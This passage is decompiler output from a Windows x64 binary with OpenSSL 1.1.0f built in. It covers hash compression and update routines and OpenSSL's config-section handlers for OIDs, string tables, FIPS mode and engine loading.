      v490 = v478 + v531 + (v488 ^ v487);
      v491 = v488 ^ v489;
      v492 = v481 + __ROL4__(v490, 5);
      v493 = __ROL4__(v488, 10);
      v494 = v481 + v534 + (v492 ^ v491);
      v495 = v492 ^ v493;
      v496 = __ROL4__(v492, 10);
      v497 = v485 + __ROL4__(v494, 14);
      v498 = v489 + __ROL4__(v485 + v533 + (v497 ^ v495), 6);
      v499 = __ROL4__(v498, 10);
      v500 = v497 ^ v496 ^ v498;
      v501 = __ROL4__(v497, 10);
      v502 = v493 + __ROL4__(v489 + v525 + v500, 8);
      v503 = v493 + v526 + (v501 ^ v502 ^ v498);
      v504 = v502 ^ v499;
      v505 = v496 + __ROL4__(v503, 13);
      v506 = __ROL4__(v502, 10);
      v507 = v501 + __ROL4__(v496 + v535 + (v505 ^ v504), 6);
      v508 = v499 + __ROL4__(v501 + v541 + (v507 ^ v505 ^ v506), 5);
      v509 = __ROL4__(v505, 10);
      v510 = v508 ^ v507 ^ v509;
      v511 = __ROL4__(v507, 10);
      v512 = v262 + *a1;
      v513 = v506 + __ROL4__(v499 + v527 + v510, 15);
      v514 = __ROL4__(v513, 10);
      v515 = v506 + v528 + (v508 ^ v511 ^ v513);
      v516 = __ROL4__(v508, 10);
      v517 = v509 + __ROL4__(v515, 13);
      v518 = v517 ^ v514;
      v519 = v509 + v529 + (v516 ^ v517 ^ v513);
      v520 = v261 + v536 + __ROL4__(v517, 10);
      v521 = v546 + v539;
      v8 = v516 + v260 + v538;
      v522 = v511 + __ROL4__(v519, 11);
      a1[2] = v8;
      *a1 = v520;
      v6 = v522 + v512;
      v539 = v6;
      v523 = __ROL4__(v511 + v532 + (v522 ^ v518), 11);
      v524 = __ROL4__(v258, 10) + v537;
      a2 = v547;
      v7 = v516 + v523 + v521;
      v537 = v8;
      v4 = v548;
      v3 = v514 + v524;
      v536 = v3;
      a1[1] = v3;
      v538 = v7;
      a1[3] = v7;
      a1[4] = v6;
    }
    while ( v548 );
  }
}

//----- (000000014009F940) ----------------------------------------------------
char __fastcall sub_14009F940(__int64 a1, _BYTE *a2, unsigned __int64 a3)
{
  _QWORD *v3; // rax
  unsigned int v4; // ebx
  int v5; // r12d
  int v6; // r14d
  unsigned __int64 v7; // rsi
  unsigned __int64 v10; // rcx
  unsigned int v12; // r13d
  __int64 v13; // r8
  unsigned __int8 v14; // bp
  __int64 v15; // r8
  unsigned __int8 v16; // bp
  __int64 v17; // r8
  char v18; // al
  unsigned int v19; // ecx
  unsigned __int64 v20; // rdx
  __int64 v21; // rbx

  v4 = *(_DWORD *)(a1 + 128);
  *(_QWORD *)(a1 + 136) += a3;
  v5 = -(int)a3 & 7;
  v6 = v4 & 7;
  v7 = a3;
  if ( *(_QWORD *)(a1 + 136) < a3 )
  {
    v10 = (unsigned int)((_DWORD)v3 - 31);
    v3 = (_QWORD *)(a1 + 144);
    do
    {
      if ( (*v3)++ != -1i64 )
        break;
      ++v10;
      ++v3;
    }
    while ( v10 < 4 );
  }
LABEL_5:
  if ( v5 || v6 )
  {
    v12 = 8 - v5;
    while ( 1 )
    {
      while ( 1 )
      {
        if ( !v7 )
          return (char)v3;
        v13 = v4 >> 3;
        if ( v6 == v5 )
        {
          v4 += v12;
          v6 = 0;
          v18 = *a2 & (255 >> v5);
          v5 = 0;
          *(_BYTE *)(v13 + a1 + 64) |= v18;
          ++a2;
          LOBYTE(v3) = v12;
          v7 -= v12;
          if ( v4 == 512 )
          {
            LOBYTE(v3) = sub_1400B6280((__int64 *)a1, a1 + 64, 1i64);
            v4 = 0;
          }
          *(_DWORD *)(a1 + 128) = v4;
          goto LABEL_5;
        }
        if ( v7 >= 8 )
          break;
        v16 = *a2 << v5;
        if ( v6 )
        {
          LOBYTE(v3) = v16 >> v6;
          *(_BYTE *)(v13 + a1 + 64) |= v16 >> v6;
        }
        else
        {
          *(_BYTE *)(v13 + a1 + 64) = v16;
        }
        v4 += v7;
        v17 = (unsigned int)(v13 + 1);
        if ( v4 == 512 )
        {
          LOBYTE(v3) = sub_1400B6280((__int64 *)a1, a1 + 64, 1i64);
          v17 = 0i64;
          v4 = 0;
        }
        if ( v6 )
          *(_BYTE *)(v17 + a1 + 64) = v16 << (8 - v6);
        v7 = 0i64;
LABEL_26:
        *(_DWORD *)(a1 + 128) = v4;
      }
      LOBYTE(v3) = *a2 << v5;
      v14 = (unsigned __int8)v3 | (a2[1] >> v12);
      if ( v6 )
      {
        LOBYTE(v3) = v14 >> v6;
        *(_BYTE *)(v13 + a1 + 64) |= v14 >> v6;
      }
      else
      {
        *(_BYTE *)(v13 + a1 + 64) = v14;
      }
      v4 += 8;
      v7 -= 8i64;
      ++a2;
      v15 = (unsigned int)(v13 + 1);
      if ( v4 >= 0x200 )
      {
        LOBYTE(v3) = sub_1400B6280((__int64 *)a1, a1 + 64, 1i64);
        v15 = 0i64;
        v4 &= 0x1FFu;
      }
      if ( !v6 )
        goto LABEL_26;
      *(_BYTE *)(v15 + a1 + 64) = v14 << (8 - v6);
      *(_DWORD *)(a1 + 128) = v4;
    }
  }
  while ( v7 )
  {
    if ( v4 || !(v7 >> 9) )
    {
      v19 = v4 >> 3;
      v20 = 512 - v4;
      if ( v7 < v20 )
      {
        LOBYTE(v3) = (unsigned __int8)memmove((void *)(v19 + a1 + 64), a2, v7 >> 3);
        v4 += v7;
        v7 = 0i64;
      }
      else
      {
        v7 -= v20;
        v21 = (512 - v4) >> 3;
        memmove((void *)(v19 + a1 + 64), a2, (unsigned int)v21);
        a2 += v21;
        LOBYTE(v3) = sub_1400B6280((__int64 *)a1, a1 + 64, 1i64);
        v4 = 0;
      }
      *(_DWORD *)(a1 + 128) = v4;
    }
    else
    {
      LOBYTE(v3) = sub_1400B6280((__int64 *)a1, (__int64)a2, v7 >> 9);
      a2 += (v7 >> 9 << 6) & 0x1FFFFFFFFFFFFFFFi64;
      v7 &= 0x1FFu;
    }
  }
  return (char)v3;
}
// 14009F995: variable 'v3' is possibly undefined

//----- (000000014009FC00) ----------------------------------------------------
__int64 __fastcall sub_14009FC00(_OWORD *a1, __int64 a2)
{
  __int64 v4; // r9
  int v5; // ecx
  unsigned int v6; // r9d
  _BYTE *v7; // rax
  __int64 v8; // r8
  unsigned __int64 *v9; // rdx
  unsigned __int64 v10; // rcx

  v4 = *(_DWORD *)(a2 + 128) >> 3;
  v5 = *(_DWORD *)(a2 + 128) & 7;
  if ( v5 )
    *(_BYTE *)(v4 + a2 + 64) |= 128 >> v5;
  else
    *(_BYTE *)(v4 + a2 + 64) = 0x80;
  v6 = v4 + 1;
  if ( v6 > 0x20 )
  {
    if ( v6 < 0x40 )
      memset((void *)(v6 + a2 + 64), 0, 64 - v6);
    sub_1400B6280((__int64 *)a2, a2 + 64, 1i64);
    v6 = 0;
    goto LABEL_9;
  }
  if ( v6 < 0x20 )
LABEL_9:
    memset((void *)(v6 + a2 + 64), 0, 32 - v6);
  v7 = (_BYTE *)(a2 + 127);
  v8 = 4i64;
  v9 = (unsigned __int64 *)(a2 + 136);
  do
  {
    v10 = *v9++;
    *v7 = v10;
    v7 -= 8;
    v10 >>= 8;
    v7[7] = v10;
    v10 >>= 8;
    v7[6] = v10;
    v10 >>= 8;
    v7[5] = v10;
    v10 >>= 8;
    v7[4] = v10;
    v10 >>= 8;
    v7[3] = v10;
    v10 >>= 8;
    v7[2] = v10;
    v7[1] = BYTE1(v10);
    --v8;
  }
  while ( v8 );
  sub_1400B6280((__int64 *)a2, a2 + 64, 1i64);
  if ( !a1 )
    return 0i64;
  *a1 = *(_OWORD *)a2;
  a1[1] = *(_OWORD *)(a2 + 16);
  a1[2] = *(_OWORD *)(a2 + 32);
  a1[3] = *(_OWORD *)(a2 + 48);
  sub_140023440(a2, 168i64);
  return 1i64;
}

//----- (000000014009FD60) ----------------------------------------------------
__int64 __fastcall sub_14009FD60(void *a1)
{
  memset(a1, 0, 0xA8ui64);
  return 1i64;
}

//----- (000000014009FD90) ----------------------------------------------------
__int64 __fastcall sub_14009FD90(__int64 a1, char *a2, unsigned __int64 a3)
{
  unsigned __int64 v3; // r12
  unsigned int v6; // ebx
  unsigned __int64 v7; // rdi
  char v8; // r15
  char *v9; // r14
  unsigned __int64 v10; // rcx
  _QWORD *v11; // rax
  char v13; // si
  __int64 v14; // r9
  __int64 v15; // r9
  __int64 v16; // r9
  unsigned int v17; // ecx
  unsigned __int64 v18; // rdx
  __int64 v19; // rbx
  unsigned __int64 v21; // [rsp+58h] [rbp+10h]

  v3 = a3;
  if ( a3 >= 0x1000000000000000i64 )
  {
    v21 = a3 >> 60;
    do
    {
      v6 = *(_DWORD *)(a1 + 128);
      v7 = 0x8000000000000000ui64;
      *(_QWORD *)(a1 + 136) += 0x8000000000000000ui64;
      v8 = v6 & 7;
      v9 = a2;
      if ( *(_QWORD *)(a1 + 136) < 0x8000000000000000ui64 )
      {
        v10 = 1i64;
        v11 = (_QWORD *)(a1 + 144);
        do
        {
          if ( (*v11)++ != -1i64 )
            break;
          ++v10;
          ++v11;
        }
        while ( v10 < 4 );
      }
      if ( (v6 & 7) != 0 )
      {
        while ( v7 )
        {
          v13 = *v9;
          v14 = v6 >> 3;
          *(_BYTE *)(v14 + a1 + 64) |= (unsigned __int8)*v9 >> v8;
          if ( v7 < 8 )
          {
            v6 += v7;
            v16 = (unsigned int)(v14 + 1);
            if ( v6 == 512 )
            {
              sub_1400B6280((__int64 *)a1, a1 + 64, 1i64);
              v16 = 0i64;
              v6 = 0;
            }
            *(_BYTE *)(v16 + a1 + 64) = v13 << (8 - v8);
            v7 = 0i64;
            *(_DWORD *)(a1 + 128) = v6;
          }
          else
          {
            v6 += 8;
            v7 -= 8i64;
            ++v9;
            v15 = (unsigned int)(v14 + 1);
            if ( v6 >= 0x200 )
            {
              sub_1400B6280((__int64 *)a1, a1 + 64, 1i64);
              v15 = 0i64;
              v6 &= 0x1FFu;
            }
            *(_BYTE *)(v15 + a1 + 64) = v13 << (8 - v8);
            *(_DWORD *)(a1 + 128) = v6;
          }
        }
      }
      else
      {
        do
        {
          if ( v6 || !(v7 >> 9) )
          {
            v17 = v6 >> 3;
            v18 = 512 - v6;
            if ( v7 < v18 )
            {
              memmove((void *)(v17 + a1 + 64), v9, v7 >> 3);
              v6 += v7;
              v7 = 0i64;
            }
            else
            {
              v7 -= v18;
              v19 = (512 - v6) >> 3;
              memmove((void *)(v17 + a1 + 64), v9, (unsigned int)v19);
              v9 += v19;
              sub_1400B6280((__int64 *)a1, a1 + 64, 1i64);
              v6 = 0;
            }
            *(_DWORD *)(a1 + 128) = v6;
          }
          else
          {
            sub_1400B6280((__int64 *)a1, (__int64)v9, v7 >> 9);
            v9 += (v7 >> 9 << 6) & 0x1FFFFFFFFFFFFFFFi64;
            v7 &= 0x1FFu;
          }
        }
        while ( v7 );
      }
      v3 -= 0x1000000000000000i64;
      a2 += 0x1000000000000000i64;
      --v21;
    }
    while ( v21 );
  }
  if ( v3 )
    sub_14009F940(a1, a2, 8 * v3);
  return 1i64;
}
// 14009FEF5: conditional instruction was optimized away because rdi.8==8000000000000000

//----- (00000001400A0010) ----------------------------------------------------
_BOOL8 sub_1400A0010()
{
  return sub_14002EAE0("oid_section", (__int64)sub_1400A0040, (__int64)guard_check_icall_nop);
}
// 140003C30: using guessed type __int64 __fastcall guard_check_icall_nop();

//----- (00000001400A0040) ----------------------------------------------------
__int64 __fastcall sub_1400A0040(__int64 a1, __int64 a2)
{
  __int64 jumpbuf_sp; // rax
  unsigned int *v4; // rax
  unsigned int *v5; // r12
  int v7; // r15d
  __int64 v8; // rax
  const char *v9; // rdi
  __int64 v10; // r14
  char *v11; // rax
  char *v12; // rbx
  __int64 v13; // rbp
  char *v14; // rsi
  unsigned __int8 v15; // al
  int v16; // ecx
  unsigned int v17; // r14d
  int v18; // ecx
  int v19; // ecx
  const char *v20; // rbx
  int v21; // ecx
  char *v22; // rax
  char *v23; // rbp

  jumpbuf_sp = _except_get_jumpbuf_sp();
  v4 = (unsigned int *)sub_14005BFA0(a2, jumpbuf_sp);
  v5 = v4;
  if ( v4 )
  {
    v7 = 0;
    if ( (int)sub_1400296E0(v4) <= 0 )
    {
      return 1i64;
    }
    else
    {
      while ( 1 )
      {
        v8 = sub_140029880((__int64)v5, v7);
        v9 = *(const char **)(v8 + 16);
        v10 = *(_QWORD *)(v8 + 8);
        v11 = strrchr(v9, 44);
        v12 = v11;
        if ( v11 )
        {
          v14 = v11 + 1;
          v13 = 0i64;
          v15 = v11[1];
          if ( !v15 )
            break;
          if ( isspace(v15) )
          {
            do
              v16 = (unsigned __int8)*++v14;
            while ( isspace(v16) );
          }
        }
        else
        {
          v13 = v10;
          v14 = (char *)v9;
        }
        v17 = sub_14002BDE0(v14, v10, v13);
        if ( !v17 )
          break;
        if ( v12 )
        {
          if ( isspace(*(unsigned __int8 *)v9) )
          {
            do
              v18 = *(unsigned __int8 *)++v9;
            while ( isspace(v18) );
          }
          v19 = (unsigned __int8)*(v12 - 1);
          v20 = v12 - 1;
          if ( isspace(v19) )
          {
            while ( v20 != v9 )
            {
              v21 = *(unsigned __int8 *)--v20;
              if ( !isspace(v21) )
                goto LABEL_16;
            }
            break;
          }
LABEL_16:
          v22 = (char *)sub_14001D8E0(v20 + 1 - v9 + 1);
          v23 = v22;
          if ( !v22 )
            break;
          memmove(v22, v9, v20 + 1 - v9);
          v20[v23 - v9 + 1] = 0;
          sub_14002C0F0(v17)[1] = v23;
        }
        if ( ++v7 >= (int)sub_1400296E0(v5) )
          return 1i64;
      }
      sub_140024610(13, 174, 171, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\asn_moid.c", 38);
      return 0i64;
    }
  }
  else
  {
    sub_140024610(13, 174, 172, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\asn_moid.c", 32);
    return 0i64;
  }
}
// 1400206D0: using guessed type __int64 _except_get_jumpbuf_sp(void);
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00000001400A0240) ----------------------------------------------------
_BOOL8 sub_1400A0240()
{
  return sub_14002EAE0("stbl_section", (__int64)sub_1400A0290, (__int64)sub_1400A0270);
}

//----- (00000001400A0270) ----------------------------------------------------
void sub_1400A0270()
{
  sub_1400B6DD0();
}

//----- (00000001400A0290) ----------------------------------------------------
__int64 __fastcall sub_1400A0290(__int64 a1, __int64 a2)
{
  __int64 jumpbuf_sp; // rax
  unsigned int *v4; // rax
  unsigned int *v5; // rbx
  __int64 v7; // rdi
  int v8; // r13d
  __int64 v9; // rax
  int v10; // r14d
  int v11; // r15d
  int v12; // ebx
  unsigned int *v13; // rbp
  __int64 v14; // rsi
  int v15; // r12d
  int *v16; // rax
  int v17; // esi
  __int64 v18; // rdx
  __int64 v19; // r8
  char v20; // cl
  _BYTE *v21; // rax
  const char *v22; // rdx
  __int64 v23; // r8
  __int64 v24; // rcx
  char v25; // al
  __int64 v26; // rcx
  char v27; // al
  __int64 v28; // rcx
  char v29; // al
  __int64 v30; // rdx
  __int64 v31; // rcx
  char v32; // al
  __int64 v33; // rax
  char v34; // cl
  __int64 v35; // [rsp+30h] [rbp-58h]
  char *EndPtr; // [rsp+38h] [rbp-50h] BYREF
  _BYTE *v37; // [rsp+40h] [rbp-48h]
  unsigned int *v38; // [rsp+48h] [rbp-40h]
  int v39; // [rsp+A0h] [rbp+18h] BYREF
  int v40; // [rsp+A8h] [rbp+20h]

  jumpbuf_sp = _except_get_jumpbuf_sp();
  v4 = (unsigned int *)sub_14005BFA0(a2, jumpbuf_sp);
  v38 = v4;
  v5 = v4;
  if ( v4 )
  {
    v7 = 0i64;
    v8 = 0;
    if ( (int)sub_1400296E0(v4) <= 0 )
    {
      return 1i64;
    }
    else
    {
      while ( 1 )
      {
        v9 = sub_140029880((__int64)v5, v8);
        v10 = -1;
        v40 = 0;
        v11 = -1;
        v39 = 0;
        v12 = 0;
        v13 = 0i64;
        v14 = *(_QWORD *)(v9 + 8);
        v37 = *(_BYTE **)(v9 + 16);
        v35 = v14;
        v15 = sub_14002C720(v14);
        if ( !v15 )
        {
          v15 = sub_14002BF10(v14);
          if ( !v15 )
            goto LABEL_13;
        }
        v16 = sub_1400B8890(v37);
        v13 = (unsigned int *)v16;
        if ( v16 )
        {
          v17 = 0;
          if ( (int)sub_1400296E0((unsigned int *)v16) > 0 )
          {
            do
            {
              v7 = sub_140029880((__int64)v13, v17);
              v18 = 0i64;
              v19 = *(_QWORD *)(v7 + 8);
              do
              {
                v20 = *(_BYTE *)(v19 + v18++);
                if ( v20 != aMin[v18 - 1] )
                {
                  v24 = 0i64;
                  do
                  {
                    v25 = *(_BYTE *)(v19 + v24++);
                    if ( v25 != aMax[v24 - 1] )
                    {
                      v26 = 0i64;
                      do
                      {
                        v27 = *(_BYTE *)(v19 + v26++);
                        if ( v27 != aMask[v26 - 1] )
                        {
                          v28 = 0i64;
                          while ( 1 )
                          {
                            v29 = *(_BYTE *)(v19 + v28++);
                            if ( v29 != aFlags[v28 - 1] )
                              goto LABEL_12;
                            if ( v28 == 6 )
                            {
                              v30 = *(_QWORD *)(v7 + 16);
                              v31 = 0i64;
                              while ( 1 )
                              {
                                v32 = *(_BYTE *)(v30 + v31++);
                                if ( v32 != aNomask[v31 - 1] )
                                  break;
                                if ( v31 == 7 )
                                {
                                  v12 = 2;
                                  goto LABEL_37;
                                }
                              }
                              v33 = 0i64;
                              while ( 1 )
                              {
                                v34 = *(_BYTE *)(v30 + v33++);
                                if ( v34 != aNone[v33 - 1] )
                                  goto LABEL_12;
                                if ( v33 == 5 )
                                {
                                  v12 = 1;
                                  goto LABEL_37;
                                }
                              }
                            }
                          }
                        }
                      }
                      while ( v26 != 5 );
                      if ( !(unsigned int)sub_1400B7110(*(const char **)(v7 + 16), &v39) || !v39 )
                        goto LABEL_12;
                      goto LABEL_37;
                    }
                  }
                  while ( v24 != 4 );
                  v11 = strtoul(*(const char **)(v7 + 16), &EndPtr, 0);
                  if ( *EndPtr )
                    goto LABEL_12;
                  goto LABEL_37;
                }
              }
              while ( v18 != 4 );
              v10 = strtoul(*(const char **)(v7 + 16), &EndPtr, 0);
              if ( *EndPtr )
              {
LABEL_12:
                v14 = v35;
                goto LABEL_13;
              }
LABEL_37:
              ++v17;
            }
            while ( v17 < (int)sub_1400296E0(v13) );
          }
          v40 = sub_1400B6D30(v15, v10, v11, v39, v12);
          if ( !v40 )
            sub_140024610(13, 222, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\asn_mstbl.c", 110);
        }
        else
        {
LABEL_13:
          sub_140024610(13, 222, 218, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\asn_mstbl.c", 100);
          if ( v7 )
          {
            v21 = *(_BYTE **)(v7 + 16);
            v22 = "field=";
            v23 = *(_QWORD *)(v7 + 8);
          }
          else
          {
            v21 = v37;
            v22 = "name=";
            v23 = v14;
          }
          sub_140023A40(4, v22, v23, ", value=", v21);
        }
        sub_140029720(v13, (void (*)(void))sub_1400B8520);
        if ( !v40 )
          break;
        v5 = v38;
        ++v8;
        v7 = 0i64;
        if ( v8 >= (int)sub_1400296E0(v38) )
          return 1i64;
      }
      sub_140024610(13, 223, 219, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\asn_mstbl.c", 36);
      return 0i64;
    }
  }
  else
  {
    sub_140024610(13, 223, 172, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\asn_mstbl.c", 30);
    return 0i64;
  }
}
// 1400206D0: using guessed type __int64 _except_get_jumpbuf_sp(void);
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00000001400A0660) ----------------------------------------------------
_BOOL8 sub_1400A0660()
{
  return sub_14002EAE0("alg_section", (__int64)sub_1400A0690, 0i64);
}

//----- (00000001400A0690) ----------------------------------------------------
__int64 __fastcall sub_1400A0690(__int64 a1, __int64 a2)
{
  __int64 jumpbuf_sp; // rax
  unsigned int *v4; // rax
  unsigned int *v5; // rsi
  int v7; // ebx
  __int64 v8; // rdi
  int v9; // [rsp+50h] [rbp+18h] BYREF

  jumpbuf_sp = _except_get_jumpbuf_sp();
  v4 = (unsigned int *)sub_14005BFA0(a2, jumpbuf_sp);
  v5 = v4;
  if ( !v4 )
  {
    sub_140024610(6, 177, 165, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\evp\\evp_cnf.c", 29);
    return 0i64;
  }
  v7 = 0;
  if ( (int)sub_1400296E0(v4) <= 0 )
    return 1i64;
  while ( 1 )
  {
    v8 = sub_140029880((__int64)v5, v7);
    if ( strcmp(*(const char **)(v8 + 8), "fips_mode") )
    {
      sub_140024610(6, 177, 169, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\evp\\evp_cnf.c", 53);
      sub_140023A40(4, "name=", *(_QWORD *)(v8 + 8), ", value=", *(_QWORD *)(v8 + 16));
      goto LABEL_9;
    }
    if ( !(unsigned int)sub_1400B8590((_QWORD *)v8, &v9) )
      break;
    if ( v9 > 0 )
    {
      sub_140024610(6, 177, 167, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\evp\\evp_cnf.c", 48);
      return 0i64;
    }
LABEL_9:
    if ( ++v7 >= (int)sub_1400296E0(v5) )
      return 1i64;
  }
  sub_140024610(6, 177, 168, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\evp\\evp_cnf.c", 37);
  return 0i64;
}
// 1400206D0: using guessed type __int64 _except_get_jumpbuf_sp(void);
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00000001400A0820) ----------------------------------------------------
_BOOL8 sub_1400A0820()
{
  return sub_14002EAE0("engines", (__int64)sub_1400A0920, (__int64)sub_1400A08C0);
}

//----- (00000001400A0850) ----------------------------------------------------
__int64 __fastcall sub_1400A0850(__int64 a1)
{
  int *v2; // rax

  if ( (unsigned int)sub_140025980(a1) )
  {
    v2 = (int *)qword_140143480;
    if ( qword_140143480 || (v2 = (int *)sub_1400296C0(), (qword_140143480 = (__int64)v2) != 0) )
    {
      if ( (unsigned int)sub_1400297C0(v2, a1) )
        return 1i64;
    }
    sub_140025890(a1);
  }
  return 0i64;
}
// 140025890: using guessed type __int64 __fastcall sub_140025890(_QWORD);
// 140143480: using guessed type __int64 qword_140143480;

//----- (00000001400A08C0) ----------------------------------------------------
void sub_1400A08C0()
{
  __int64 i; // rax

  for ( i = sub_1400296F0((int *)qword_140143480); i; i = sub_1400296F0((int *)qword_140143480) )
    sub_140025890(i);
  sub_1400294B0((void **)qword_140143480);
  qword_140143480 = 0i64;
}
// 140025890: using guessed type __int64 __fastcall sub_140025890(_QWORD);
// 140143480: using guessed type __int64 qword_140143480;

//----- (00000001400A0920) ----------------------------------------------------
__int64 __fastcall sub_1400A0920(__int64 a1, __int64 a2)
{
  __int64 v2; // rdi
  __int64 jumpbuf_sp; // rax
  unsigned int *v4; // rax
  __int64 v5; // rsi
  int v7; // ebp
  int v8; // ebx
  __int64 v9; // rax
  __int64 v10; // rsi
  int v11; // r13d
  const char *v12; // r15
  __int64 v13; // rbx
  char *v14; // rax
  unsigned int *v15; // rax
  unsigned int *v16; // r12
  _QWORD *v17; // r14
  const char *v18; // rbx
  char *v19; // rax
  const char *v20; // rdi
  __int64 v21; // rax
  const char *v22; // r8
  char *v23; // rdx
  __int64 v24; // rax
  char v25; // cl
  bool v26; // zf
  __int64 v27; // rcx
  char v28; // al
  int v29; // eax
  int *v30; // rax
  int v31; // [rsp+40h] [rbp-58h]
  const char *v32; // [rsp+48h] [rbp-50h]
  unsigned int *v33; // [rsp+50h] [rbp-48h]
  int v35; // [rsp+B0h] [rbp+18h] BYREF
  int v36; // [rsp+B8h] [rbp+20h]

  v2 = a2;
  jumpbuf_sp = _except_get_jumpbuf_sp();
  v4 = (unsigned int *)sub_14005BFA0(v2, jumpbuf_sp);
  v33 = v4;
  v5 = (__int64)v4;
  if ( v4 )
  {
    v7 = 0;
    v8 = 0;
    v31 = 0;
    if ( (int)sub_1400296E0(v4) <= 0 )
    {
      return 1i64;
    }
    else
    {
      while ( 1 )
      {
        v9 = sub_140029880(v5, v8);
        v36 = 0;
        v35 = -1;
        v10 = 0i64;
        v11 = 0;
        v12 = *(const char **)(v9 + 8);
        v13 = *(_QWORD *)(v9 + 16);
        v32 = (const char *)v13;
        v14 = strchr(v12, 46);
        if ( v14 )
          v12 = v14 + 1;
        v15 = (unsigned int *)sub_14005BFA0(v2, v13);
        v16 = v15;
        if ( !v15 )
          break;
        if ( (int)sub_1400296E0(v15) > 0 )
        {
          do
          {
            v17 = (_QWORD *)sub_140029880((__int64)v16, v7);
            v18 = (const char *)v17[1];
            v19 = strchr(v18, 46);
            if ( v19 )
              v18 = v19 + 1;
            v20 = (const char *)v17[2];
            if ( !strcmp(v18, "engine_id") )
            {
              v12 = v20;
            }
            else if ( !strcmp(v18, "soft_load") )
            {
              v11 = 1;
            }
            else
            {
              if ( !strcmp(v18, "dynamic_path") )
              {
                v21 = sub_140040E80("dynamic");
                v10 = v21;
                if ( !v21
                  || !(unsigned int)sub_140076280(v21, "SO_PATH", v20, 0)
                  || !(unsigned int)sub_140076280(v10, "LIST_ADD", "2", 0) )
                {
                  goto LABEL_49;
                }
                v22 = 0i64;
                v23 = "LOAD";
              }
              else
              {
                if ( !v10 )
                {
                  v10 = sub_140040E80(v12);
                  if ( !v10 )
                  {
                    if ( v11 )
                    {
                      sub_140023B90();
                      goto LABEL_55;
                    }
                    goto LABEL_49;
                  }
                }
                v24 = 0i64;
                while ( 1 )
                {
                  v25 = v20[v24++];
                  v26 = v25 == aEmpty[v24 - 1];
                  if ( v25 != aEmpty[v24 - 1] )
                    break;
                  if ( v24 == 6 )
                  {
                    v26 = v25 == aEmpty[5];
                    break;
                  }
                }
                if ( v26 )
                  v20 = 0i64;
                v27 = 0i64;
                while ( 1 )
                {
                  v28 = v18[v27++];
                  if ( v28 != aInit[v27 - 1] )
                    break;
                  if ( v27 == 5 )
                  {
                    if ( !(unsigned int)sub_14005BEE0(a2, v32, "init", &v35) )
                      goto LABEL_49;
                    if ( v35 == 1 )
                    {
                      v29 = sub_1400A0850(v10);
                      goto LABEL_39;
                    }
                    if ( v35 )
                    {
                      sub_140024610(
                        38,
                        188,
                        151,
                        (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_cnf.c",
                        122);
                      goto LABEL_49;
                    }
                    goto LABEL_40;
                  }
                }
                if ( !strcmp(v18, "default_algorithms") )
                {
                  v29 = sub_14002F9E0(v10, v20);
                  goto LABEL_39;
                }
                v22 = v20;
                v23 = (char *)v18;
              }
              v29 = sub_140076280(v10, v23, v22, 0);
LABEL_39:
              if ( !v29 )
                goto LABEL_49;
            }
LABEL_40:
            ++v7;
          }
          while ( v7 < (int)sub_1400296E0(v16) );
          if ( v10 && v35 == -1 )
          {
            if ( !(unsigned int)sub_140025980(v10) )
              goto LABEL_48;
            if ( (v30 = (int *)qword_140143480) == 0i64
              && (v30 = (int *)sub_1400296C0(), (qword_140143480 = (__int64)v30) == 0)
              || !(unsigned int)sub_1400297C0(v30, v10) )
            {
              sub_140025890(v10);
LABEL_48:
              v17 = 0i64;
LABEL_49:
              sub_140024610(38, 188, 102, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_cnf.c", 141);
              if ( v17 )
                sub_140023A40(6, "section=", *v17, ", name=", v17[1], ", value=", v17[2]);
              goto LABEL_54;
            }
          }
        }
        v36 = 1;
LABEL_54:
        sub_1400349C0(v10);
        if ( !v36 )
          return 0i64;
LABEL_55:
        v5 = (__int64)v33;
        v8 = ++v31;
        if ( v31 >= (int)sub_1400296E0(v33) )
          return 1i64;
        v2 = a2;
        v7 = 0;
      }
      sub_140024610(38, 188, 149, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_cnf.c", 61);
      return 0i64;
    }
  }
  else
  {
    sub_140024610(38, 187, 148, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_cnf.c", 165);
    return 0i64;
  }
}
// 1400206D0: using guessed type __int64 _except_get_jumpbuf_sp(void);
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 140025890: using guessed type __int64 __fastcall sub_140025890(_QWORD);
// 140143480: using guessed type __int64 qword_140143480;

//----- (00000001400A0D90) ----------------------------------------------------
void *__fastcall sub_1400A0D90(__int64 a1)
{
  int v1; // eax
  void *result; // rax
  void *v4; // rbx

  result = sub_14001D8E0((unsigned int)(v1 - 8));
  v4 = result;
  if ( result )
  {
    if ( (*(unsigned int (__fastcall **)(void *))(a1 + 16))(result) )
    {
      return v4;
    }
    else
    {
      sub_14001D930(v4);
      return 0i64;
    }
  }
  return result;
}
// 1400A0DAA: variable 'v1' is possibly undefined

//----- (00000001400A0E00) ----------------------------------------------------
__int64 __fastcall sub_1400A0E00(_QWORD *a1)
{
  if ( !a1 )
    return 0i64;
  a1[2] = 0i64;
  *a1 = &off_14013D030;
  a1[1] = "\b";
  return 1i64;
}
// 14013D030: using guessed type char *off_14013D030;

//----- (00000001400A0E30) ----------------------------------------------------
__int64 __fastcall sub_1400A0E30(_QWORD *a1)
{
  if ( !a1 )
    return 0i64;
  a1[2] = 0i64;
  *a1 = &off_14013D080;
  a1[1] = &unk_140119870;
  return 1i64;
}
// 14013D080: using guessed type char *off_14013D080;

//----- (00000001400A0E60) ----------------------------------------------------
__int64 __fastcall sub_1400A0E60(void *a1)
{
  if ( !a1 )
    return 0i64;
